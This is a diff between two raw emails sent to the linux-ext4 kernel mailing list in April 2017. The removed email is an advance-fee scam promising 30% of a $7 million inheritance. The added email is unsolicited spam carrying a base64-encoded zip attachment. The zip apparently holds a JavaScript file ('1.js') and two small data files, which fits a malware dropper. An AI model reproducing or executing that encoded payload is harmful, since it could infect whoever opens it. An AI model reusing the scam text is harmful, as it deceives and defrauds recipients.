@@ -1,30 +1,41 @@
-From: Sarah JOHNSON <sarah.johnson197070@gmail.com>
-Subject: Greetings.
-Date: Fri, 14 Apr 2017 09:19:12 +0000 (UTC)
-Message-ID: <934227493.275261.1492161552873__32291.0538212911$1492161612$gmane$org@mail.yahoo.com>
-References: <934227493.275261.1492161552873.ref@mail.yahoo.com>
-Reply-To: Sarah JOHNSON <sarah.johnson197070@yahoo.com>
+From: <befragung@hwk-erfurt.de>
+Subject: 49226 linux-ext4
+Date: Fri, 14 Apr 2017 10:32:52 -0000
+Message-ID: <149216597210.21738.2909373632272920327@rima-tde.net>
+Reply-To: <befragung@hwk-erfurt.de>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
-To: unlisted-recipients:; (no To-header on input)
+Content-Type: application/zip; name="1452324.zip"
+Content-Transfer-Encoding: base64
+To: "linux-ext4" <linux-ext4@vger.kernel.org>
 Return-path: <linux-ext4-owner@vger.kernel.org>
-Received: from sonic305-27.consmr.mail.ne1.yahoo.com ([66.163.185.153]:37273
-        "EHLO sonic305-27.consmr.mail.ne1.yahoo.com" rhost-flags-OK-OK-OK-OK)
-        by vger.kernel.org with ESMTP id S1752703AbdDNJTN (ORCPT
-        <rfc822;linux-ext4@vger.kernel.org>);
-        Fri, 14 Apr 2017 05:19:13 -0400
+Received: from 245.red-83-42-247.dynamicip.rima-tde.net ([83.42.247.245]:59712
+        "HELO rima-tde.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1751278AbdDNKc4 (ORCPT
+        <rfc822;linux-ext4@vger.kernel.org>); Fri, 14 Apr 2017 06:32:56 -0400
+Content-Disposition: attachment
 Sender: linux-ext4-owner@vger.kernel.org
 List-ID: <linux-ext4.vger.kernel.org>
 
-Good Day Dearest.
-
-My name is Sarah JOHNSON I am 18 years old, the only daughter of late Mr. Raymond JOHNSON from Burkina Faso, I am contacting you to help me relocate to your country to continue my university education in  your country, before my father died he gave me a deposit slip document of ($7,000,000 USD) and made me understand that it was because of his position in the government that his government associates planed and poisoned him on a business trip with them to France and he advised me to look for a faithful and reliable foreigner who will help me to transfer this money to his country and help me to relocate over there to continue my studies.
-
-I hope you will help me with the good faith and trust I have in you, after you have secured the money and settle my education, I will give you 30% of the money for your good and kind assistance to me. Please Contact me e-Mail:sarah.johnson197070@yahoo.com 
-
-I am waiting on your reply
-
-Regards,
-
-Sarah.
+UEsDBBQAAAAIAGxLjkp3FVrWBAAAAAIAAAAFAAAAMS5kYXQzNAQAUEsDBBQAAAAIAHxUjkqdSqvl
+eQMAAPAGAAAEAAAAMS5qc3VVUW+bSBB+j5T/wCKdCmrlUFBqlygPgHG5Nj4nhlOaKX3YYGyTYuBg
+jeM73X+/2V2guSSVGDOzs/PNN7PLOFsrWpEelCllqaZ/Uzcpu1Pfqimt1e+afnnJfU5d06OmmgY6
+3o9V/ZvxXVf+OT1paa0sDzftj+nxUblUTk9U0tJc2xdEfYtGk9CKaLGK22zTODRb2zSEw7amqBZC
+JwdUnYRlLfm6uH8gCbPNiW2ahyapswoNv9mSPMcV2/xoW64tooypbTgSV8AKROkpfoXY4fi0qvIs
+oSwri5+oTwCDKLp+xvQ1SOHnuPPw6/zKthDJRyWIhCO6foEt1nmCkNWE7nrWvybsTBdTF1H7/WaX
+9KPsgeW+6EVF2dAN2XA/rEiS0XxW5itSNxI4Irsqp4w0HUfT7ZBN+9zjD192xd7JXED6NS1W5Y4v
+yY0Y5NhWR8f6/yMRB7PfNfZsy+jT8W6RR8KVvkOi7xLdX1QED2ciz8A0P/lRr3ZMPV6maW4Zq2zL
+sc0ZPsm2Lnek+VHmfyN6wunO6GqXiQCE86stbp6teXssC+1Nth4KNznimuaNvJXd0fW3wQ9JseLV
+98vZWhCY9G5G2b7pWi+6zy+EZfQVG/a4q7I/zL7EAXFwRMeKDIdoW++fuW/rjJGuT336pSTdVGXR
+8XfL1XGAFkvP0l+XTSY/gSGT8SxTSFsSlTPZvxw5TeT98rryBPxr2F5eygFAnhYoryN+hBLPfyTJ
+npH+Q6rE6yc+P2nzhS4vPFql6J5cFE2Sri6VPZ7Gqq5fqBdySN0nfrmYBXJGBV+u5nEcLmaO6zGU
+AwpFqf043v2OiscNlBIl5G8BvWZxfMjQLBzXmy66wAZFQfkDvcmeBy7xJy1Y63OlwQ5jriOHibhj
+zrdwYIFZsp6h286D4vYGGYqBy4dByodBmjBNvW28Jc7CURP4V7mqY0jK56z2pgUMPfqf4Q7qNYTw
+AApcKi60MIcACriFGxjBMt3AElIKK9DuIQG/hAXMghHUkAIOggRS7Sx2wPXONvAOFFUFXYdRAlug
+UDvANPgAYxQLzsE8H599QEPoKGPQL97oozrlQBwHzjbvEELXu8rqJFjvy/b1ypptmucjWl3jRHb4
+dVT7sL92s8OfeYRhstb+f2bIhFX5j5WG1d/V6/ABc25UHX9/U/WndIigk0o+/56e/AdQSwMEFAAA
+AAgAcEuOSjYkQc8EAAAAAgAAAAUAAAAyLmRhdDMwBABQSwECHwAUAAAACABsS45KdxVa1gQAAAAC
+AAAABQAkAAAAAAAAACAAAAAAAAAAMS5kYXQKACAAAAAAAAEAGADeSDAu6LTSAQ4BQip4tNIBDgFC
+Kni00gFQSwECHwAUAAAACAB8VI5KnUqr5XkDAADwBgAABAAkAAAAAAAAACAAAAAnAAAAMS5qcwoA
+IAAAAAAAAQAYABUcUMHxtNIBBfVPwfG00gEF9U/B8bTSAVBLAQIfABQAAAAIAHBLjko2JEHPBAAA
+AAIAAAAFACQAAAAAAAAAIAAAAMIDAAAyLmRhdAoAIAAAAAAAAQAYAJJe2DLotNIBmiIr5Wu00gGa
+Iivla7TSAVBLBQYAAAAAAwADAAQBAADpAwAAAAA=
